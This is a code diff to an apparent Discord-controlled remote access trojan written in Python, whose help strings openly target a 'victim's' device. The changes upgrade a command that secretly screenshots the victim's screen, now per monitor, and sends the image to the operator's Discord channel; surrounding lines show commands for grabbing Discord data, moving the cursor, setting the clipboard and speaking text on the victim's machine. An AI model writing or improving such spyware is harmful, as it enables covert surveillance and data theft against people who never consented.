@@ -539,7 +539,7 @@ async def getdiscord(ctx):
     except Exception as e:
         await ctx.send(f"Error executing getdiscord: {str(e)}")
     
-@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
+@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display, If you dont like it, you can suck it.")
 async def setpos(ctx, x: int, y: int):
     try:
         pyautogui.moveTo(x, y)
@@ -618,17 +618,42 @@ async def set_clipboard(ctx, *, text: str):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")   
 
-@bot.command(help="Takes a screenshot of the victim's screen including cursor location.")
-async def ss(ctx):
-    img = ImageGrab.grab()
-    cursor_position = pyautogui.position()
+@bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).")
+async def ss(ctx, display_index: int = 0):
+    import mss
+    import mss.tools
+    import pyautogui
+    from PIL import Image, ImageDraw
+    import tempfile
 
-    draw = ImageDraw.Draw(img)
-    draw.ellipse((cursor_position[0]//2-5, cursor_position[1]//2-5, cursor_position[0]//2+5, cursor_position[1]//2+5), fill=(255, 0, 0))
+    with mss.mss() as sct:
+        # sct.monitors[0] is the full desktop; [1:] are individual monitors.
+        monitors = sct.monitors
+        if display_index < 0 or display_index >= len(monitors):
+            available = ", ".join(str(i) for i in range(len(monitors)))
+            await ctx.send(f"Invalid display index provided. Available displays: {available}")
+            return
 
-    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
-        img.save(temp_file, 'PNG')
-        await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
+        monitor = monitors[display_index]
+        sct_img = sct.grab(monitor)
+        # Convert the mss screenshot to a PIL image
+        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+
+        # Get the global cursor position
+        cursor = pyautogui.position()
+        # Adjust the cursor position relative to the monitor's top-left
+        relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
+
+        # Draw a red dot at the cursor position
+        draw = ImageDraw.Draw(img)
+        x, y = relative_cursor
+        draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
+
+        # Save to a temporary file and send
+        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
+            img.save(temp_file, 'PNG')
+            await ctx.send("Command Executed! (Red dot indicates cursor)", 
+                           file=discord.File(temp_file.name, filename="screenshot.png"))
         
 @bot.command(name="tts", help="Run TTS on victim's system")
 async def tts(ctx, *, text: str):
